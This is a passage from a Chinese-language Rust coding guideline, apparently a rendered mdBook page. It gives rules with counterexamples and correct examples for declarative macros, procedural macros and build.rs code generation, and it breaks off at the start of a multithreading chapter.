        Ok(t) =&gt; t,
        Err(e) =&gt; panic!(&quot;{}: {:?}&quot;, msg, &amp;e),  // 不符合
    }
}

pub fn unwrap_err(self) -&gt; E {
    match self {
        Ok(t) =&gt; panic!(&quot;{}: {:?}&quot;, &quot;called `Result::unwrap_err()` on an `Ok` value&quot;, &amp;t), // 不符合
        Err(e) =&gt; e,
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[inline(never)]
#[cold]
#[track_caller] // 为了定位 panic 发生时的调用者的位置
fn unwrap_failed(msg: &amp;str, error: &amp;dyn fmt::Debug) -&gt; ! {
    panic!(&quot;{}: {:?}&quot;, msg, error)
}

pub fn expect(self, msg: &amp;str) -&gt; T {
    match self {
        Ok(t) =&gt; t,
        Err(e) =&gt; unwrap_failed(msg, &amp;e), // 符合
    }
}

pub fn unwrap_err(self) -&gt; E {
    match self {
        Ok(t) =&gt; unwrap_failed(&quot;called `Result::unwrap_err()` on an `Ok` value&quot;, &amp;t),  // 符合
        Err(e) =&gt; e,
    }
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="声明宏"><a class="header" href="#声明宏">声明宏</a></h1>
<p><a href="https://doc.rust-lang.org/reference/macros-by-example.html">声明宏</a> 也被叫做 示例宏（macros by example），或者简单地叫做 宏。目前声明宏使用 <code>macro_rules!</code>来定义。</p>
<p>声明宏的特点是：它只用作代码替换，而无法进行计算。</p>
<h2 id="列表-6"><a class="header" href="#列表-6">列表</a></h2>
<ul>
<li><a href="safe-guides/coding_practice/macros/./decl/P.MAC.DCL.01.html">P.MAC.DCL声明宏内的变量作为外部变量使用</a></li>
<li><a href="safe-guides/coding_practice/macros/./decl/P.MAC.DCL.02.html">P.MAC.DCL.02 在编写多个宏规则时，应该先从匹配粒度最小的开始写</a></li>
<li><a href="safe-guides/coding_practice/macros/./decl/P.MAC.DCL.03.html">P.MAC.DCL.03 不要在片段分类符跟随它不匹配的符号</a></li>
<li><a href="safe-guides/coding_practice/macros/./decl/P.MAC.DCL.04.html">P.MAC.DCL.04 匹配规则要精准，不要模糊不清</a></li>
<li><a href="safe-guides/coding_practice/macros/./decl/P.MAC.DCL.05.html">P.MAC.DCL.05 使用宏替换（substitution）元变量的时候要注意选择合适的片段分类符</a></li>
<li><a href="safe-guides/coding_practice/macros/./decl/P.MAC.DCL.06.html">P.MAC.DCL.06 当宏需要接收 self 时需要注意</a></li>
<li><a href="safe-guides/coding_practice/macros/./decl/P.MAC.DCL.07.html">P.MAC.DCL.07 确保在宏定义之后再去调用宏</a></li>
<li><a href="safe-guides/coding_practice/macros/./decl/P.MAC.DCL.08.html">P.MAC.DCL.08 同一个 crate 内定义的宏相互调用时，需要注意卫生性</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmacdcl01-不要将声明宏内的变量作为外部变量使用"><a class="header" href="#pmacdcl01-不要将声明宏内的变量作为外部变量使用">P.MAC.DCL.01 不要将声明宏内的变量作为外部变量使用</a></h2>
<p><strong>【描述】</strong></p>
<p>声明宏是半卫生（semi-hygienic）宏，其内部元变量（metavariables）不可作为外部变量去使用。但是对于泛型参数（包括生命周期参数）是不卫生的，所以要小心使用。</p>
<p><strong>【反例】</strong></p>
<p>下面为卫生场景示例：</p>
<pre><pre class="playground"><code class="language-rust">macro_rules! using_a {
    ($e:expr) =&gt; {
        {
            let a = 42;
            $e
        }
    }
}

fn main() {
    let four = using_a!(a / 10); // build error:  cannot find value `a` in this scope
}
</code></pre></pre>
<p>下面为不卫生场景示例：</p>
<pre><pre class="playground"><code class="language-rust">trait FooTrait {
    fn get(&amp;self) -&gt; i32;
}

// 使用宏为带生命周期的类型实现 FooTrait
macro_rules! impl_FooTrait {
    ($name:ty) =&gt; {
        // 这里使用的 'a 是宏内部定义
        impl&lt;'a&gt; $crate::FooTrait for $name { 
            fn get(&amp;self) -&gt; i32 {
                *self.0
            }    
        }
    };
}

struct Baz&lt;'a&gt;(&amp;'a i32);

impl_FooTrait!(Baz&lt;'a&gt;); // 这里的 'a 是宏外部


// 整个程序正常编译运行，说明宏内外的 'a 被共用，不卫生
fn main() {
    let val = 20;
    let baz = Baz(&amp;val);
    method(&amp;baz);
}

// 测试实现 FooTrait 的方法
fn method(foo: &amp;dyn FooTrait) {
    println!(&quot;{:?}&quot;, foo.get());
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<p>下面为卫生场景示例：</p>
<pre><pre class="playground"><code class="language-rust">macro_rules! using_a {
    ($a:ident, $e:expr) =&gt; {{
        let $a = 42;
        $e
    }};
}

fn main() {
    let four = using_a!(a, a / 10);
}
</code></pre></pre>
<p>下面为不卫生场景示例：</p>
<pre><pre class="playground"><code class="language-rust">trait FooTrait {
    fn get(&amp;self) -&gt; i32;
}

// 使用宏为带生命周期的类型实现 FooTrait
macro_rules! impl_FooTrait {
    // 这里不直接使用宏内部定义的 'a ，而从外面通过 $lifetime 传入
    // 是为了避免不卫生可能引发的问题
    ($name:ty, $lifetime:tt) =&gt; {
        impl&lt;$lifetime&gt; $crate::FooTrait for $name { 
            fn get(&amp;self) -&gt; i32 {
                *self.0
            }    
        }
    };
}

struct Baz&lt;'a&gt;(&amp;'a i32);

impl_FooTrait!(Baz&lt;'a&gt;, 'a); // 这里的 'a 是从宏外部传入到宏内


// 整个程序正常编译运行
fn main() {
    let val = 20;
    let baz = Baz(&amp;val);
    method(&amp;baz);
}

// 测试实现 FooTrait 的方法
fn method(foo: &amp;dyn FooTrait) {
    println!(&quot;{:?}&quot;, foo.get());
}

</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmacdcl02-在编写多个宏规则时应该先从匹配粒度最小的开始写"><a class="header" href="#pmacdcl02-在编写多个宏规则时应该先从匹配粒度最小的开始写">P.MAC.DCL.02 在编写多个宏规则时，应该先从匹配粒度最小的开始写</a></h2>
<p><strong>【描述】</strong></p>
<p>因为声明宏中，是按规则的编写顺序来匹配的。当第一个规则被匹配到，后面的规则将永远不会匹配到。所以，编写声明宏规则时，需要先写匹配粒度最小的，最具体的规则，然后逐步编写匹配范围更广泛的规则。</p>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[macro_export]
macro_rules! foo {
    (@as_expr $e:expr) =&gt; {$e}; // expr 比 tt 匹配更加具体

    ($($tts:tt)*) =&gt; {
        foo!(@as_expr $($tts)*)
    };
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmacdcl03-不要在片段分类符跟随它不匹配的符号"><a class="header" href="#pmacdcl03-不要在片段分类符跟随它不匹配的符号">P.MAC.DCL.03 不要在片段分类符跟随它不匹配的符号</a></h2>
<p><strong>【描述】</strong></p>
<p><code>macro_rules!</code> 定义声明宏时，非终止的元变量匹配必须紧随一个已被决定能在这种匹配之后安全使用的标记。</p>
<p>具体的规则参见：<a href="https://doc.rust-lang.org/reference/macros-by-example.html#follow-set-ambiguity-restrictions">Follow-set Ambiguity Restrictions</a></p>
<p>片段分类符（<a href="https://doc.rust-lang.org/nightly/reference/macros-by-example.html#metavariables">fragment-specifier</a>）的说明参见<a href="safe-guides/coding_practice/macros/decl/./../../../Appendix/terms.html">附录B：术语解释</a></p>
<p><strong>【反例】</strong></p>
<p>对于 <code>[,]</code> 这样的分隔标记就是非法的。这是为了防止未来 Rust 语法变动导致宏定义失效。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[macro_export]
macro_rules! foo {
    ($e1:expr [,] $e2:expr) =&gt; {$e1; $e2}; 
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<p>该示例中，元变量 <code>$e1</code> 的 片段分类符 <code>expr</code> 是非终止的，所以后面需要跟随一个用于分隔的标记。</p>
<p>Rust 规定在 <code>expr</code> 片段分类符 后面可以合法地跟随 <code>=&gt;</code> / <code>,</code> / <code>;</code> 。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[macro_export]
macro_rules! foo {
    ( $e1:expr, $e2:expr) =&gt; {$e1; $e2}; 
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmacdcl04-匹配规则要精准不要模糊不清"><a class="header" href="#pmacdcl04-匹配规则要精准不要模糊不清">P.MAC.DCL.04 匹配规则要精准，不要模糊不清</a></h2>
<p><strong>【描述】</strong></p>
<p>匹配规则必须精准，因为宏解析器并不会去执行代码，它无法匹配模糊不清的规则。</p>
<p><strong>【反例】</strong></p>
<p>宏解析器无法确定第一次匹配的应该是多少个 <code>ident</code>。</p>
<pre><pre class="playground"><code class="language-rust">macro_rules! ambiguity {
    ($($i:ident)* $i2:ident) =&gt; { };
}

// error:
//    local ambiguity: multiple parsing options: built-in NTs ident ('i') or ident ('i2').
fn main() { ambiguity!(an_identifier); }
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">macro_rules! ambiguity {
    ($i2:ident $($i:ident)* ) =&gt; { };
}

// ok
fn main() { ambiguity!(an_identifier  an_identifier2); }
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmacdcl05-使用宏替换substitution元变量的时候要注意选择合适的片段分类符"><a class="header" href="#pmacdcl05-使用宏替换substitution元变量的时候要注意选择合适的片段分类符">P.MAC.DCL.05 使用宏替换（substitution）元变量的时候要注意选择合适的片段分类符</a></h2>
<p><strong>【描述】</strong></p>
<p>使用宏替换（substitution）元变量，就是指把已经进行过宏解析的 token 再次传给宏，需要注意此时传入的 token 已经被看作是宏解析器解析后的 AST 节点了。</p>
<p>片段分类符介绍（<a href="https://doc.rust-lang.org/nightly/reference/macros-by-example.html#metavariables">fragment-specifier</a>）</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">macro_rules! capture_then_what_is {
    (#[$m:meta]) =&gt; {what_is!(#[$m])};   // 这里片段分类符用的是 meta
}

macro_rules! what_is {
    (#[no_mangle]) =&gt; {&quot;no_mangle attribute&quot;};
    (#[inline]) =&gt; {&quot;inline attribute&quot;};
    ($($tts:tt)*) =&gt; {concat!(&quot;something else (&quot;, stringify!($($tts)*), &quot;)&quot;)};
}

fn main() {
    println!(
        &quot;{}\n{}\n{}\n{}&quot;,
        what_is!(#[no_mangle]),
        what_is!(#[inline]),
        capture_then_what_is!(#[no_mangle]), // 被 capture_then_what_is 宏 解析过的token，不会再二次被 what_is 宏解析，所以按 tt 规则处理
        capture_then_what_is!(#[inline]), // 被 capture_then_what_is 宏 解析过的token，不会再二次被 what_is 宏解析，所以按 tt 规则处理
    );
}
// 输出：
// no_mangle attribute
// inline attribute
// something else (#[no_mangle])
// something else (#[inline])
</code></pre></pre>
<p><strong>【正例】</strong></p>
<p>满足示例这类正常匹配情况的目前只有 <code>tt</code>、<code>ident</code> 或者 <code>lifetime</code> 分类符。</p>
<pre><pre class="playground"><code class="language-rust">macro_rules! capture_then_what_is {
    (#[$m:tt]) =&gt; {what_is!(#[$m])}; // 这里片段分类符用的是 tt
}

macro_rules! what_is {
    (#[no_mangle]) =&gt; {&quot;no_mangle attribute&quot;};
    (#[inline]) =&gt; {&quot;inline attribute&quot;};
    ($($tts:tt)*) =&gt; {concat!(&quot;something else (&quot;, stringify!($($tts)*), &quot;)&quot;)};
}

fn main() {
    println!(
        &quot;{}\n{}\n{}\n{}&quot;,
        what_is!(#[no_mangle]),
        what_is!(#[inline]),
        capture_then_what_is!(#[no_mangle]), // 被 capture_then_what_is 宏 解析过的token，还会被 what_is 二次处理
        capture_then_what_is!(#[inline]), // 被 capture_then_what_is 宏 解析过的token，还会被 what_is 二次处理
    );
}
// 输出：
// no_mangle attribute
// inline attribute
// no_mangle attribute
// inline attribute
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmacdcl06-当宏需要接收-self-时需要注意"><a class="header" href="#pmacdcl06-当宏需要接收-self-时需要注意">P.MAC.DCL.06 当宏需要接收 <code>self</code> 时需要注意</a></h2>
<p><strong>【描述】</strong></p>
<p><code>self</code> 在 Rust 中属于关键字，它会在代码运行时被替换为具体类型的实例。当它传递给 宏 时会被看做为一个变量，而宏对于变量而言是具备卫生性的。而且，声明宏的作用只是替换而非计算，它并不能计算出 self 的具体类型。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">macro_rules! make_mutable {
    ($i:ident) =&gt; {let mut $i = $i;};
}

struct Dummy(i32);

impl Dummy {
    fn double(self) -&gt; Dummy {
        make_mutable!(self);  // 这里传入的 self 和宏内部 let 定义的 self 不同
        self.0 *= 2;
        self
    }
}

fn main() {
    println!(&quot;{:?}&quot;, Dummy(4).double().0);
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">macro_rules! double_method {
    ($self_:ident, $body:expr) =&gt; {
        fn double(mut $self_) -&gt; Dummy {
            $body
        }
    };
}

struct Dummy(i32);

impl Dummy {
    double_method! {self, {
        self.0 *= 2;
        self
    }}
}

fn main() {
    println!(&quot;{:?}&quot;, Dummy(4).double().0);
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmacdcl07-确保在宏定义之后再去调用宏"><a class="header" href="#pmacdcl07-确保在宏定义之后再去调用宏">P.MAC.DCL.07 确保在宏定义之后再去调用宏</a></h2>
<p><strong>【描述】</strong></p>
<p>Rust 中类型或函数在定义前后都可以调用，但是宏不一样。Rust 查找宏定义是按词法依赖顺序的，必须注意定义和调用的先后顺序。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">mod a {
    // X!(); // undefined
}

mod b {
    // X!(); // undefined
    macro_rules! X { () =&gt; {}; }
    X!(); // defined
}

mod c {
    // X!(); // undefined
}

fn main() {}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">macro_rules! X { () =&gt; {}; }

mod a {
    X!(); // defined
}

mod b {
    X!(); // defined
}

mod c {
    X!(); // defined
}

fn main() {}
</code></pre></pre>
<p><strong>【例外】</strong></p>
<p>宏与宏之间相互调用，不受词法顺序的限制。</p>
<pre><pre class="playground"><code class="language-rust">mod a {
    // X!(); // undefined
}

macro_rules! X { () =&gt; { Y!(); }; } // 注意：这里的 Y! 宏是在定义前被调用的，代码正常执行

mod b {
    // X!(); // defined, but Y! is undefined 
}

macro_rules! Y { () =&gt; {}; } // Y! 宏被定义在 X! 宏后面

mod c {
    X!(); // defined, and so is Y!
}
fn main() {}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmacdcl08-同一个-crate-内定义的宏相互调用时需要注意卫生性"><a class="header" href="#pmacdcl08-同一个-crate-内定义的宏相互调用时需要注意卫生性">P.MAC.DCL.08 同一个 crate 内定义的宏相互调用时，需要注意卫生性</a></h2>
<p><strong>【描述】</strong></p>
<p>当同一个 crate 内定义的宏相互调用时候，应该使用 <code>$crate</code> 元变量来指代当前被调用宏的路径。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[macro_export]
macro_rules! helped {
    () =&gt; { helper!() } // This might lead to an error due to 'helper' not being in scope.
}

#[macro_export]
macro_rules! helper {
    () =&gt; { () }
}

//// 在另外的 crate 中使用这两个宏
// 注意：`helper_macro::helper` 并没有导入进来
use helper_macro::helped;

fn unit() {
   // Error! 这个宏会出现问题，因为其内部调用的 helper 宏的路径会被编译器认为是当前调用crate 的路径
   helped!();
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[macro_export]
macro_rules! helped {
    () =&gt; { $crate::helper!() }
}

#[macro_export]
macro_rules! helper {
    () =&gt; { () }
}

//// 在另外的 crate 中使用这两个宏
// 注意：`helper_macro::helper` 并没有导入进来
use helper_macro::helped;

fn unit() {
   // OK! 这个宏能运行通过，因为 `$crate` 正确地展开成 `helper_macro` crate 的路径（而不是使用者的路径）
   helped!();
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="过程宏"><a class="header" href="#过程宏">过程宏</a></h1>
<p><a href="https://doc.rust-lang.org/reference/procedural-macros.html">过程宏（<em>Procedural macros</em>）</a> 允许开发者来创建语法扩展。你可以通过过程宏创建类似函数的宏、派生宏以及属性宏。</p>
<p>广义上的&quot;过程宏&quot;指的是通过 syn/quote(毕竟几乎全部过程宏库都用 syn) 及 syn 生态(例如 darling) 进行代码生成等元编程操作。</p>
<p>syn/quote 不仅能用于过程宏，还广泛用于代码生成(<em>codegen</em>)、静态分析等用途，例如 tonic-build/prost 源码中也用到了 syn/quote 。</p>
<p>因此本过程宏规范不仅适用于过程宏，部分规范(例如 <a href="safe-guides/coding_practice/macros/./proc/P.MAC.PRO.06.html">P.MAC.PRO.06</a>) 还适用于 prost 这种代码生成库</p>
<p>过程宏必须被单独定义在一个类型为<code>proc-macro</code> 的 crate 中。</p>
<p>过程宏有两类报告错误的方式：<code>panic</code> 或 通过 <code>compile_error</code>  宏调用发出错误。</p>
<p>过程宏不具有卫生性（hygiene），这意味着它会受到外部语法项（item）的影响，也会影响到外部导入。</p>
<p>过程宏可以在编译期执行任意代码。</p>
<h2 id="列表-7"><a class="header" href="#列表-7">列表</a></h2>
<ul>
<li><a href="safe-guides/coding_practice/macros/./proc/P.MAC.PRO.01.html">P.MAC.PRO.01 不要使用过程宏来规避静态分析检查</a></li>
<li><a href="safe-guides/coding_practice/macros/./proc/P.MAC.PRO.02.html">P.MAC.PRO.02 实现过程宏时要对关键特性增加测试</a></li>
<li><a href="safe-guides/coding_practice/macros/./proc/P.MAC.PRO.03.html">P.MAC.PRO.03 保证过程宏的卫生性</a></li>
<li><a href="safe-guides/coding_practice/macros/./proc/P.MAC.PRO.04.html">P.MAC.PRO.04 给出正确的错误位置</a></li>
<li><a href="safe-guides/coding_practice/macros/./proc/P.MAC.PRO.05.html">P.MAC.PRO.05 代码生成要按情况选择使用过程宏还是 build.rs</a></li>
<li><a href="safe-guides/coding_practice/macros/./proc/P.MAC.PRO.06.html">P.MAC.PRO.06 build.rs 生成的代码要保证没有任何警告</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmacpro01-不要使用过程宏来规避静态分析检查"><a class="header" href="#pmacpro01-不要使用过程宏来规避静态分析检查">P.MAC.PRO.01 不要使用过程宏来规避静态分析检查</a></h2>
<p><strong>【描述】</strong></p>
<p>不要利用过程宏来定义能规避 Rust 静态分析检查的宏。</p>
<p><strong>【反例】</strong></p>
<p>在 Rust 生态中有一个库 <a href="https://github.com/mxxo/plutonium"><code>plutonium</code></a>，该库利用了过程宏来消除代码中直接的 <code>unsafe</code> 块的使用，从而规避了编译器对 <code>unsafe</code> 关键字的静态检查。</p>
<p>该库会通过<code>#[safe]</code> 过程宏在自动生成代码的时候为函数体添加 <code>unsafe</code> 块，但这会影响到 <code>unsafe</code> 调用链依赖静态检查传播，从而进一步打断 unsafe 调用链路，影响后续通过 <code>unsafe</code> 关键字来定位问题。</p>
<pre><pre class="playground"><code class="language-rust">use plutonium::safe;

#[safe]
fn super_safe(x: f32) -&gt; i32 {
    std::mem::transmute::&lt;f32, i32&gt;(x)
}

#[safe]
unsafe fn deref_null() {
    *std::ptr::null::&lt;u8&gt;();
}

fn main(){
    println!(&quot;{:?}&quot;, super_safe(1.0));
    deref_null();
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<p>对于不安全的函数，应该显式地使用 <code>unsafe</code> 。这样做的好处是利用 Rust 编译器静态检查传播 unsafe 调用链条，以达到可以全局查找 unsafe 使用来消除一些代码隐患，方便定位问题。</p>
<pre><pre class="playground"><code class="language-rust">unsafe fn super_safe(x: f32) -&gt; i32 {
    unsafe { std::mem::transmute::&lt;f32, i32&gt;(x) }
}

unsafe fn deref_null() {
    unsafe { *std::ptr::null::&lt;u8&gt;(); }
}

fn main(){
    println!(&quot;{:?}&quot;, unsafe{super_safe(1.0f32)}); // 1065353216
    // error[E0133]: call to unsafe function is unsafe and requires unsafe function or block
    // deref_null();  // 如果调用 unsafe 函数不加 unsafe 块，编译器就会报错。
    unsafe{ deref_null(); }
}
</code></pre></pre>
<p><strong>【相关讨论】</strong></p>
<ul>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2020-0011.html">RUSTSEC-2020-0011</a></li>
<li><a href="https://github.com/RustSec/advisory-db/issues/275">https://github.com/RustSec/advisory-db/issues/275</a></li>
<li><a href="https://github.com/rust-lang/unsafe-code-guidelines/issues/278">https://github.com/rust-lang/unsafe-code-guidelines/issues/278</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmacpro02-实现过程宏时要对关键特性增加测试"><a class="header" href="#pmacpro02-实现过程宏时要对关键特性增加测试">P.MAC.PRO.02 实现过程宏时要对关键特性增加测试</a></h2>
<p><strong>【描述】</strong></p>
<p>实现过程宏的时候，要对关键特性增加测试，这是为了避免出现关键特性遗漏的情况。 </p>
<p><strong>【反例】</strong></p>
<p>在第三方库 <a href="https://github.com/iqlusioninc/crates/tree/main/zeroize">zeroize</a> 中，曾经因为过程宏中对枚举类型没有实现 Drop 而引起问题。参见：<a href="https://rustsec.org/advisories/RUSTSEC-2021-0115.html">RUSTSEC-2021-0115</a></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[derive(Zeroize)]
#[zeroize(drop)]
pub enum Fails {
    Variant(Vec&lt;u8&gt;),
}

// This does compile with zeroize_derive version 1.1, meaning `#[zeroize(drop)]` didn't implement `Drop`.
impl Drop for Fails {
    fn drop(&amp;mut self) {
        todo!()
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<p>在第三方库 <a href="https://github.com/iqlusioninc/crates/tree/main/zeroize">zeroize</a> 中，曾经因为过程宏中对枚举类型没有实现 Drop 而引起问题。增加关键性测试可以避免这类问题。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[test]
fn zeroize_on_struct() {
    parse_zeroize_test(stringify!(
        #[zeroize(drop)]
        struct Z {
            a: String,
            b: Vec&lt;u8&gt;,
            c: [u8; 3],
        }
    ));
}

#[test]
fn zeroize_on_enum() {
    parse_zeroize_test(stringify!(
        #[zeroize(drop)]
        enum Z {
            Variant1 { a: String, b: Vec&lt;u8&gt;, c: [u8; 3] },
        }
    ));
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmacpro03-保证过程宏的卫生性"><a class="header" href="#pmacpro03-保证过程宏的卫生性">P.MAC.PRO.03 保证过程宏的卫生性</a></h2>
<p><strong>【描述】</strong></p>
<p>过程宏生成的代码尽量使用完全限定名，防止命名冲突产生意想不到的后果。</p>
<p>可以使用 <code>#![no_implicit_prelude]</code> 属性来验证过程宏的卫生性。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![no_implicit_prelude]

<span class="boring">fn main() {
</span>#[derive(MyMacro)]
struct A;
<span class="boring">}
</span></code></pre></pre>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>quote!(a.to_string())
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>quote!(std::string::ToString::to_string(a))
<span class="boring">}
</span></code></pre></pre>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>quote! {{
    use std::string::ToString;
    a.to_string()
}}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmacpro04-给出正确的错误位置"><a class="header" href="#pmacpro04-给出正确的错误位置">P.MAC.PRO.04 给出正确的错误位置</a></h2>
<p><strong>【描述】</strong></p>
<p>过程宏发生错误时，返回的错误应该有正确的位置信息。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 直接用Span::call_site()
Error::new(Span::call_site(), &quot;requires unit variant&quot;)
    .to_compile_error()
    .into()
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[proc_macro_derive(MyMacro)]
pub fn derive_my_macro(input: TokenStream) -&gt; TokenStream {
    let derive_input: DeriveInput = syn::parse_macro_input!(input as DeriveInput);

    if let Data::Enum(e) = &amp;derive_input.data {
        for variant in &amp;e.variants {
            if !variant.fields.is_empty() {
                // 使用variant的span
                return syn::Error::new_spanned(&amp;variant, &quot;must be a unit variable.&quot;)
                    .to_compile_error()
                    .into();
            }
        }
    }

    todo!()
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="代码生成"><a class="header" href="#代码生成">代码生成</a></h1>
<p>Rust 中代码生成的方式包括宏 与 <code>build.rs</code> 两种方式。关于宏，有独立的规范章节，本章节规范内容包括：</p>
<ul>
<li><code>build.rs</code> 使用规范</li>
<li>代码生成相关其他规范</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="pcgn01-代码生成要按情况选择使用过程宏还是-buildrs"><a class="header" href="#pcgn01-代码生成要按情况选择使用过程宏还是-buildrs">P.CGN.01 代码生成要按情况选择使用过程宏还是 <code>build.rs</code></a></h1>
<p><strong>【描述】</strong></p>
<p>用过程宏生进行代码生成，比如生成新类型或函数，有一个缺点就是：IDE 无法识别它们，影响开发体验。</p>
<p>但是使用 <code>build.rs</code> 生成的代码，对 IDE 更友好。</p>
<p>不过随着 IDE 的增强，过程宏以后应该也能变得更加 IDE 友好。</p>
<p>建议按应用场景选择：</p>
<ul>
<li><code>build.rs</code> 一般用于根据外部文件生成代码的场景。比如根据 <code>C</code> 头文件生成 Rust 绑定，或者根据 <code>proto</code> 文件生成相应的 Rust 类型等，供开发者直接使用。</li>
<li>过程宏一般用于消除样例式代码，提升库使用者的开发体验。</li>
</ul>
<p><strong>【正例】</strong></p>
<p><code>build.rs</code> 把 <code>tonic</code> 生成的代码直接放在 <code>src</code> 目录 (生成的代码文件应该在 .gitignore 中忽略版本管理)，这样 IDE 能够识别它们使自动完成能够工作，提高开发效率。</p>
<pre><pre class="playground"><code class="language-rust">fn main() -&gt; Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt; {
    tonic_build::configure()
        .out_dir(&quot;src&quot;)
        .compile(
            &amp;[&quot;proto/helloworld/helloworld.proto&quot;],
            &amp;[&quot;proto/helloworld&quot;],
        )?;
    println!(&quot;cargo:rerun-if-changed=proto&quot;);
}
</code></pre></pre>
<p><code>tarpc</code>的<code>service</code>宏会生成一个新的<code>WorldClient</code>类型，IDE完全无法识别。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[tarpc::service]
trait World {
    async fn hello(name: String) -&gt; String;
}

let (client_transport, server_transport) = tarpc::transport::channel::unbounded();
let mut client = WorldClient::new(client::Config::default(), client_transport).spawn();
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="pcgn02-buildrs-生成的代码要保证没有任何警告"><a class="header" href="#pcgn02-buildrs-生成的代码要保证没有任何警告">P.CGN.02 <code>build.rs</code> 生成的代码要保证没有任何警告</a></h1>
<p><strong>【描述】</strong></p>
<p><code>build.rs</code> 生成的代码(codegen)，要通过或忽略 clippy 检查，不要让库的使用者或应用用户自行忽略</p>
<p>codegen 库要保证生成的代码应该非常干净没有任何警告，不应该让库的使用者去处理生成代码中的警告。</p>
<p><strong>【反例】</strong></p>
<p>lalrpop v0.19.6 生成的代码有几百个 clippy 警告，&quot;淹没&quot;了用户自己代码的 clippy 警告</p>
<pre><code>warning: using `clone` on type `usize` which implements the `Copy` trait
      --&gt; /home/w/temp/my_parser/target/debug/build/my_parser-dd96f436ee76c58d/out/my_parser.rs:182148:21
       |
182148 |         let __end = __start.clone();
       |                     ^^^^^^^^^^^^^^^ help: try removing the `clone` call: `__start`
</code></pre>
<p>使得 lalrpop 库的使用者必须手动给生成的模块代码加上 allow clippy，给使用者带来不便</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>lalrpop_mod!(
    #[allow(clippy::all)]
    my_parser
);
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<p>tonic-build 生成的 rs 会通过 allow 忽略掉 clippy 警告</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub mod peer_communication_client {
    #![allow(unused_variables, dead_code, missing_docs, clippy::let_unit_value)]
    use tonic::codegen::*;
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="317-多线程"><a class="header" href="#317-多线程">3.17 多线程</a></h1>
<p>Rust 天生可以有效消除数据竞争。</p>
